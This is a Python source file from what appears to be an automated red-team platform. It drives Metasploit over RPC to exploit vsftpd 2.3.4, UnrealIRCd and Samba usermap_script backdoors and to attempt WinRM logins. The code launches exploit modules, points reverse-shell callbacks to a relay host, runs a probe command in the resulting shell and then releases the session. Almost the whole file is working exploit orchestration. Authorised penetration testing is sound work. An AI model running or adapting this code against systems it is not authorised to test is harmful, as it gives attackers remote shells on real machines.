# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: azz093093.830330@gmail.com

"""Metasploit RPC engine for Non-SSH initial access (ADR-019).

Connects to msfrpcd and executes exploit modules. Falls back to mock mode
when MOCK_METASPLOIT=true (default in CI/dev).

Supported:
  T1190 vsftpd 2.3.4 backdoor  -> exploit/unix/ftp/vsftpd_234_backdoor
  T1190 UnrealIRCd exploit      -> exploit/unix/irc/unreal_ircd_3281_backdoor
  T1190 Samba usermap_script    -> exploit/multi/samba/usermap_script
  T1021.001 WinRM               -> auxiliary/scanner/winrm/winrm_login
"""
import asyncio
import logging
import time
from typing import Any, Callable

from app.config import settings

logger = logging.getLogger(__name__)

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    MsfRpcClient = None  # type: ignore[assignment,misc]

_EXPLOIT_MAP: dict[str, tuple[str, str]] = {
    "vsftpd": ("exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact"),
    "unrealircd": ("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse"),
    "samba": ("exploit/multi/samba/usermap_script", "cmd/unix/reverse"),
    "winrm": ("auxiliary/scanner/winrm/winrm_login", ""),
}

_MOCK_RESULT: dict[str, Any] = {
    "status": "success",
    "shell": "mock_shell_id_001",
    "output": "uid=0(root) gid=0(root) groups=0(root)",
    "engine": "metasploit_mock",
}


class MetasploitRPCEngine:
    """Execute Metasploit exploit modules via msfrpcd RPC API."""

    def _connect(self) -> Any:
        if MsfRpcClient is None:
            raise RuntimeError("pymetasploit3 not installed")
        return MsfRpcClient(
            settings.MSF_RPC_PASSWORD,
            server=settings.MSF_RPC_HOST,
            port=settings.MSF_RPC_PORT,
            username=settings.MSF_RPC_USER,
            ssl=settings.MSF_RPC_SSL,
        )

    async def _read_shell_output(
        self,
        shell: Any,
        *,
        start_interval: float = 0.3,
        backoff_factor: float = 2.0,
        max_interval: float = 5.0,
        timeout: float = 15.0,
    ) -> str:
        """Read shell output with exponential backoff polling."""
        accumulated = ""
        interval = start_interval
        consecutive_empty = 0
        has_output = False
        deadline = time.monotonic() + timeout

        while time.monotonic() < deadline:
            await asyncio.sleep(interval)
            chunk = await asyncio.get_running_loop().run_in_executor(
                None, shell.read
            )
            if chunk:
                accumulated += chunk
                has_output = True
                consecutive_empty = 0
                interval = start_interval
                stripped = accumulated.rstrip()
                if stripped and stripped[-1] in ('$', '#', '>'):
                    logger.debug("Prompt detected, output complete (%d chars)", len(accumulated))
                    break
            else:
                consecutive_empty += 1
                if has_output and consecutive_empty >= 2:
                    logger.debug("2 consecutive empty reads after output, done (%d chars)", len(accumulated))
                    break
                interval = min(interval * backoff_factor, max_interval)

        if time.monotonic() >= deadline:
            logger.warning("Shell read timed out after %.1fs (%d chars accumulated)", timeout, len(accumulated))

        return accumulated

    async def _check_session_health(
        self,
        client: Any,
        session_id: str,
    ) -> bool:
        """Verify session is alive before executing commands."""
        try:
            sessions = await asyncio.get_running_loop().run_in_executor(
                None, lambda: client.sessions.list
            )
        except Exception:
            logger.warning("Failed to query Metasploit sessions list")
            return False

        if session_id not in sessions:
            logger.warning("Session %s not found in sessions list", session_id)
            return False

        session_info = sessions[session_id]
        session_type = session_info.get("type", "")
        if session_type not in ("shell", "meterpreter"):
            logger.warning("Session %s has unexpected type '%s'", session_id, session_type)
            return False

        return True

    def get_exploit_for_service(self, service_name: str) -> Callable | None:
        """Map service name to exploit method (case-insensitive substring match)."""
        s = service_name.lower()
        if "vsftpd" in s:
            return self.exploit_vsftpd
        if "unrealircd" in s or "unreal" in s:
            return self.exploit_unrealircd
        if "samba" in s or "smb" in s:
            return self.exploit_samba
        if "winrm" in s or "wsman" in s:
            return self.exploit_winrm
        return None

    async def _run_exploit(
        self,
        module_path: str,
        payload: str,
        options: dict[str, Any],
        *,
        probe_cmd: str = "id; uname -a; hostname",
    ) -> dict[str, Any]:
        """Run an exploit module in **one-shot mode** (SPEC-053).

        Each call is independent: no session reuse, no persistent
        session handles. The flow is:

            1. Launch the exploit module.
            2. Poll ``client.sessions.list`` for up to
               ``settings.METASPLOIT_SESSION_WAIT_SEC`` seconds until
               a new session appears.
            3. Write ``probe_cmd`` to the session, read the output.
            4. **Release the session immediately** via ``shell.stop()``.
            5. Return the probe output alongside the (now-released)
               session id for audit purposes only.

        If a later technique needs another shell, the upstream caller
        (e.g. ``terminal.py``) is expected to call ``_run_exploit``
        again, not to reuse the returned session id. See ADR-046 for
        the rationale ("shell needed on demand, never maintained").
        """
        if settings.MOCK_METASPLOIT:
            logger.info(
                "[MOCK] MetasploitRPC: %s against %s",
                module_path,
                options.get("RHOSTS"),
            )
            return dict(_MOCK_RESULT, module=module_path)
        # Guard: LHOST=0.0.0.0 cannot receive reverse shell callbacks from target
        if payload and options.get("LHOST") == "0.0.0.0":
            logger.warning(
                "LHOST is 0.0.0.0; reverse shell payload may not receive callback. "
                "Set LHOST to the Athena host's reachable IP."
            )
        try:
            client = await asyncio.get_running_loop().run_in_executor(
                None, self._connect
            )

            # SPEC-053: one-shot mode — do NOT reuse existing sessions.
            # Old implementation walked client.sessions.list looking for a
            # session whose target_host matched, which caused stale shells
            # (e.g. vsftpd 2.3.4 backdoor zombies on port 6200) to be
            # returned with broken I/O. Every call now launches fresh.
            pre_sessions: set = set(client.sessions.list.keys())

            module_type = (
                "exploit" if module_path.startswith("exploit") else "auxiliary"
            )
            exploit = client.modules.use(module_type, module_path)

            # Set exploit-level options (RHOSTS, etc.) via the module
            # __setitem__ interface. LHOST and LPORT are PAYLOAD options
            # and must NOT be set on the exploit module object (pymetasploit3
            # raises KeyError("Invalid option 'LHOST'")). Instead we inject
            # them directly into the module's ``runoptions`` dict, which is
            # the dict that gets sent verbatim to the msfrpc RPC call. This
            # is the supported pattern when using a string payload name
            # rather than a PayloadModule object.
            for k, v in options.items():
                if k in ("LHOST", "LPORT"):
                    # Inject payload options directly into runoptions
                    exploit.runoptions[k] = v
                else:
                    exploit[k] = v
            if payload:
                exploit.execute(payload=payload)
            else:
                exploit.execute()

            # Configurable timeout — previously hard-coded to 30s
            timeout_sec = settings.METASPLOIT_SESSION_WAIT_SEC
            sid: "str | None" = None
            for _ in range(timeout_sec):
                await asyncio.sleep(1)
                sessions = client.sessions.list
                new_sessions = {
                    k: v for k, v in sessions.items() if k not in pre_sessions
                }
                if new_sessions:
                    sid = list(new_sessions.keys())[0]
                    break

            if sid is None:
                return {
                    "status": "failed",
                    "reason": f"no session within {timeout_sec}s",
                    "engine": "metasploit",
                }

            # Run probe and always release the session, even on read errors.
            output = ""
            shell = None
            try:
                shell = client.sessions.session(sid)
                # cmd/unix/reverse shells need a brief stabilization
                # period after session creation before the I/O pipe is
                # ready. Without this, the first shell.read() often
                # returns empty even though the shell is alive.
                await asyncio.sleep(2)
                # Drain any banner or stale output from the shell
                await asyncio.get_running_loop().run_in_executor(
                    None, shell.read
                )
                # Reverse shell sessions through a relay tunnel have
                # higher I/O latency than bind shells. The msfrpcd
                # session buffer often doesn't flush until a second
                # write arrives. We work around this by sending a
                # short sentinel echo first, waiting for msfrpcd to
                # observe the I/O activity, then sending the real
                # probe command and reading the combined output.
                shell.write("echo ATHENA_PROBE_START\n")
                await asyncio.sleep(3)
                # Drain the echo response (may or may not have arrived)
                await asyncio.get_running_loop().run_in_executor(
                    None, shell.read
                )
                shell.write(probe_cmd + "\n")
                # Poll for probe output with increasing intervals
                for _wait in (3, 3, 5):
                    await asyncio.sleep(_wait)
                    output = await asyncio.get_running_loop().run_in_executor(
                        None, shell.read
                    )
                    if output:
                        break
            finally:
                if shell is not None:
                    try:
                        await asyncio.get_running_loop().run_in_executor(
                            None, shell.stop
                        )
                        logger.info(
                            "Released session %s after one-shot exploit %s",
                            sid, module_path,
                        )
                    except Exception as release_exc:
                        # Release failure is not fatal — log and continue.
                        logger.warning(
                            "Failed to release session %s after %s: %s",
                            sid, module_path, release_exc,
                        )

            return {
                "status": "success",
                "shell": sid,  # audit only; session has been stopped
                "output": output,
                "engine": "metasploit",
            }
        except Exception as exc:
            logger.exception("MetasploitRPC exploit failed: %s", module_path)
            return {"status": "failed", "reason": str(exc), "engine": "metasploit"}

    def _resolve_lhost(self, explicit_lhost: "str | None") -> str:
        """SPEC-054: Resolve LHOST from explicit arg, settings.RELAY_IP, or fallback.

        Precedence:
          1. Explicit ``lhost=`` keyword argument passed by the caller
          2. ``settings.RELAY_IP`` if non-empty
          3. ``"0.0.0.0"`` as a degraded-mode sentinel — exploit will
             still run but the existing warning in ``_run_exploit``
             will surface the fact that the reverse shell is unlikely
             to call back.
        """
        if explicit_lhost is not None:
            return explicit_lhost
        return settings.RELAY_IP or "0.0.0.0"

    async def exploit_vsftpd(
        self,
        target_ip: str,
        *,
        probe_cmd: str = "id; uname -a; hostname",
    ) -> dict[str, Any]:
        """Exploit vsftpd 2.3.4 backdoor (T1190) — bind shell, no LHOST needed.

        SPEC-054: accepts ``probe_cmd`` keyword so terminal.py's per-command
        re-exploit loop can drive this method like the reverse-shell variants.
        """
        module, payload = _EXPLOIT_MAP["vsftpd"]
        return await self._run_exploit(
            module, payload, {"RHOSTS": target_ip},
            probe_cmd=probe_cmd,
        )

    async def exploit_unrealircd(
        self,
        target_ip: str,
        lhost: "str | None" = None,
        *,
        probe_cmd: str = "id; uname -a; hostname",
    ) -> dict[str, Any]:
        """Exploit UnrealIRCd 3.2.8.1 backdoor (T1190).

        SPEC-054: ``lhost`` defaults to ``None`` so the effective value
        is resolved from ``settings.RELAY_IP`` via ``_resolve_lhost``.
        Pass ``lhost=`` explicitly to override (e.g. unit tests).
        """
        module, payload = _EXPLOIT_MAP["unrealircd"]
        effective_lhost = self._resolve_lhost(lhost)
        return await self._run_exploit(
            module, payload,
            {"RHOSTS": target_ip, "LHOST": effective_lhost},
            probe_cmd=probe_cmd,
        )

    async def exploit_samba(
        self,
        target_ip: str,
        lhost: "str | None" = None,
        *,
        probe_cmd: str = "id; uname -a; hostname",
    ) -> dict[str, Any]:
        """Exploit Samba usermap_script (T1190).

        SPEC-054: ``lhost`` defaults to ``None`` so the effective value
        is resolved from ``settings.RELAY_IP`` via ``_resolve_lhost``.
        """
        module, payload = _EXPLOIT_MAP["samba"]
        effective_lhost = self._resolve_lhost(lhost)
        return await self._run_exploit(
            module, payload,
            {"RHOSTS": target_ip, "LHOST": effective_lhost},
            probe_cmd=probe_cmd,
        )

    async def exploit_winrm(
        self,
        target_ip: str,
        username: str = "administrator",
        password: str = "",
        *,
        probe_cmd: str = "id; uname -a; hostname",
    ) -> dict[str, Any]:
        """WinRM credential login (T1021.001).

        SPEC-054: accepts ``probe_cmd`` for uniformity with other
        exploit methods (terminal.py drives all exploit methods with
        ``probe_cmd=cmd`` in its per-command re-exploit loop).
        """
        module, _ = _EXPLOIT_MAP["winrm"]
        return await self._run_exploit(
            module,
            "",
            {"RHOSTS": target_ip, "USERNAME": username, "PASSWORD": password},
            probe_cmd=probe_cmd,
        )


import uuid as _uuid_mod

from app.clients import BaseEngineClient, ExecutionResult


class MetasploitEngineAdapter(BaseEngineClient):
    """Adapts MetasploitRPCEngine to the standard BaseEngineClient interface.

    Allows EngineRouter to treat Metasploit uniformly alongside C2/MCP clients.
    """

    def __init__(self) -> None:
        self._engine = MetasploitRPCEngine()

    async def execute(
        self,
        ability_id: str,
        target: str,
        params: dict | None = None,
        output_parser: str | None = None,
    ) -> ExecutionResult:
        exec_id = str(_uuid_mod.uuid4())
        service_name = (params or {}).get("service_name", ability_id)
        method = self._engine.get_exploit_for_service(service_name)
        if method is None:
            return ExecutionResult(
                success=False,
                execution_id=exec_id,
                error=f"no exploit method for service: {service_name}",
            )
        result_dict = await method(target)
        return ExecutionResult(
            success=result_dict.get("status") == "success",
            execution_id=exec_id,
            output=result_dict.get("output", ""),
            error=result_dict.get("reason") if result_dict.get("status") != "success" else None,
        )

    async def is_available(self) -> bool:
        from app.config import settings
        return settings.MOCK_METASPLOIT or bool(settings.MSF_RPC_PASSWORD)

    async def list_abilities(self) -> list[dict]:
        return [
            {"id": name.replace("exploit_", "")}
            for name in dir(self._engine)
            if name.startswith("exploit_") and callable(getattr(self._engine, name))
        ]

    async def get_status(self, execution_id: str) -> str:
        return "unknown"
